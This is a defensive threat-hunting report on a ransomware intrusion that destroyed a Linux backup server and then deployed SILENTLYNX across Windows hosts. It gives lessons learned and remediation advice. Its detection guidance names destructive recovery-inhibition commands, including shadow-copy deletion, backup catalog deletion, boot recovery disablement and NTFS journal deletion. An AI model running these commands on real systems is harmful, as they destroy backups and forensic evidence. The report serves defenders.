The Dead in the Water ransomware intrusion exposed a deliberate, highly destructive attack chain focused on eliminating recovery capabilities before encryption, reflecting modern ransomware tradecraft rather than opportunistic malware activity. The adversary began with lateral movement from a compromised Windows workstation into a Linux backup server, using valid credentials and native remote access to systematically enumerate, access, and ultimately destroy backup data.

By targeting backup infrastructure first, stopping and disabling critical services, and harvesting stored credentials, the attacker ensured that traditional recovery paths were rendered ineffective. This was followed by coordinated cross platform execution, leveraging trusted administrative tools such as SSH, PsExec, vssadmin, and wbadmin to deploy the SILENTLYNX ransomware payload across Windows systems. Recovery inhibition techniques including shadow copy deletion, backup catalog removal, storage limitation and system recovery disablement demonstrated clear intent to maximize operational impact.

Persistence mechanisms via registry autoruns and scheduled tasks, combined with anti-forensic actions like NTFS journal deletion further indicate an attacker concerned with maintaining access and reducing post incident visibility, even after encryption succeeded. The presence of a ransom note (SILENTLYNX_README.txt) ultimately confirmed successful execution of the attack’s final objective.

This threat hunt reinforces several critical defensive lessons:

Backup systems must be treated as high-value assets with strict access controls and monitoring

Lateral movement using legitimate credentials and administrative tools requires behavioral and context-aware detection, not signature-based alerts alone

Early detection of recovery inhibition activity (VSS, backup engines, catalog deletion) can provide the last viable window to stop ransomware

Cross-platform telemetry correlation is essential to detect attacks that span Windows and Linux environments

Ultimately, Dead in the Water highlights that ransomware success is decided long before encryption begins—and that visibility into backup access, service manipulation and east–west movement is critical to preventing irreversible impact.

---

# 🎓 Lessons Learned

***Ransomware Success Is Determined Before Encryption Begins***

The adversary’s early focus on backup infrastructure compromise and destruction demonstrates that modern ransomware operations prioritize recovery denial long before payload execution. Once backups were eliminated, defenders had few remaining options to mitigate impact.

***Living off the Land Techniques Enabled Silent Progression***

The attacker relied almost exclusively on native administrative tools (SSH, PsExec, rm, systemctl, vssadmin, wbadmin) to blend into normal operational activity, significantly reducing the likelihood of signature based detection.

***Backup Systems Represent a High Value, Under Monitored Target***

Direct access to the Linux backup server using a valid privileged account allowed the attacker to enumerate, access and destroy critical recovery data with minimal resistance, highlighting the need for separate trust zones and enhanced monitoring around backup infrastructure.

***Recovery Inhibition Provided the Final Window for Detection***

Actions such as VSS deletion, backup catalog removal, service stoppage and storage limitation created multiple opportunities for detection. If correlated in real time this could have enabled last minute containment before ransomware deployment.

***Cross Platform Attacks Demand Unified Visibility***

The attack seamlessly spanned Windows and Linux systems, demonstrating that siloed monitoring leaves critical gaps. Effective defense requires correlating telemetry across operating systems to identify coordinated attacker behavior.

***Persistence and Anti-Forensics Extend Impact Beyond Encryption***

Registry autoruns, scheduled tasks and NTFS journal deletion indicate the adversary anticipated post incident response efforts and took steps to maintain access while limiting forensic reconstruction.

***Credential Abuse Remains a Primary Enabler***

The use of legitimate accounts (backup-admin, kenji.sato) enabled lateral movement and execution without triggering traditional authentication alerts, reinforcing the need for behavior based credential abuse detection rather than reliance on password changes alone.

---

## 🛠️ Recommendations for Remediation

**1. Harden and Monitor Backup Infrastructure**

Treat backup servers as Tier 0 assets with dedicated admin accounts, network segmentation and restricted access paths.

Enforce separate credentials for backup systems that are not reused on endpoints or servers.

Monitor for destructive commands (rm -rf, mass deletions, service disables) specifically within backup directories.

**2. Implement Cross-Platform Command Auditing**

Enable detailed command logging on Linux systems (auditd, bash history protections) and forward logs to a centralized SIEM.

Correlate Linux SSH activity with Windows authentication and process execution to detect coordinated cross OS attacks.

**3. Strengthen Lateral Movement Detection**

Alert on SSH access from workstations to servers, especially backup or infrastructure hosts.

Monitor PsExec usage (psexec*.exe) and remote service creation, particularly when initiated by non server systems.

Correlate remote execution with credential reuse patterns rather than relying solely on failed login detection.

**4. Detect Recovery Inhibition as a High-Severity Signal**

Treat commands such as vssadmin delete shadows, wbadmin delete catalog, net stop VSS and bcdedit recoveryenabled No as critical ransomware precursors.

Create compound alerts when multiple recovery-disabling actions occur within a short time window.

**5. Restrict and Monitor External Tool Staging**

Block or heavily monitor access to public file hosting services used for tool delivery.

Alert on archive downloads (.7z, .zip) followed by immediate execution or mass file operations.

Enforce allowlists for outbound traffic from servers, especially infrastructure hosts.

**6. Secure Credential Storage and Access**

Eliminate plaintext credential storage in configuration files and backups.

Monitor access to sensitive configuration paths for unexpected read activity.

Apply MFA and just in time access for privileged accounts used in backup and administrative operations.

**7. Harden Persistence Mechanisms**

Monitor creation or modification of registry autorun keys associated with security or system components.

Alert on scheduled task creation within Windows Security named paths that deviate from known baselines.

Perform routine audits of scheduled tasks across endpoints and servers.

**8. Detect Anti-Forensic Activity**

Alert on NTFS journal deletion commands (fsutil usn deletejournal) as indicators of post-compromise cleanup.

Treat such activity as an incident escalation trigger, not a low priority system event.

**9. Improve Incident Response Readiness**

Maintain offline or immutable backups inaccessible from standard administrative accounts.

Regularly test restoration procedures to ensure recovery paths remain viable under attack conditions.

Conduct tabletop exercises focused on early backup compromise detection rather than post-encryption response.

**10. Continuously Validate Defenses Through Threat Hunting**

Use this incident’s mapped behaviors to build ATT&CK-aligned detections and recurring hunts.

***Validate alert coverage for:***

Backup access and destruction

Recovery inhibition

East–west movement

Credential abuse with legitimate tools

***Key Takeaway***

This intrusion demonstrates that ransomware prevention hinges on early detection of backup access, recovery suppression and lateral movement not the ransomware binary itself. Defensive success depends on behavioral correlation, privilege isolation and rapid response before encryption begins.
